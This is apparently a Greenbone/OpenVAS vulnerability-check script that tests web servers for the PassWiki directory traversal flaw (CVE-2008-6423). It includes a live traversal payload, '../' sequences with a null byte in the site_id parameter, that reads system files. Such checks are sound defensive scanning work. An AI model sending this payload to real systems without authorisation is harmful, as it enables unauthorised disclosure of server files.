# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900521");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2009-03-20 07:08:52 +0100 (Fri, 20 Mar 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2008-6423");
  script_name("PassWiki passwiki.php Directory Traversal Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/30496");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/29455");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/5704");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to inject arbitrary
  web script or HTML on an affected application.");

  script_tag(name:"affected", value:"PassWiki version prior to 0.9.17 on all platforms.");

  script_tag(name:"insight", value:"Input validation error in site_id parameter in passwiki.php file allows
  arbitrary code injection.");

  script_tag(name:"solution", value:"Upgrade to version 0.9.17 or later.");

  script_tag(name:"summary", value:"PassWiki is prone to a directory traversal vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port))
  exit(0);

files = traversal_files();

foreach dir (make_list_unique("/passwiki", http_cgi_dirs(port:port))) {

  if(dir == "/") dir = "";

  sndReq = http_get(item:dir + "/passwiki.php", port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

  if("PassWiki" >!< rcvRes) {
    rcvRes = http_get_cache(item:dir + "/index.php", port:port);
  }

  if("PassWiki" >< rcvRes) {

    foreach file(keys(files)) {

      url = dir + "/passwiki.php?site_id=../../../" +
                  "../../../../../../../../../" + files[file] + "%00";
      if( http_vuln_check(port:port, url:url, pattern:file)) {
        report = http_report_vuln_url(port:port, url:url);
        security_message(port:port, data:report);
        exit(0);
      }
    }
  }
}

exit(99);
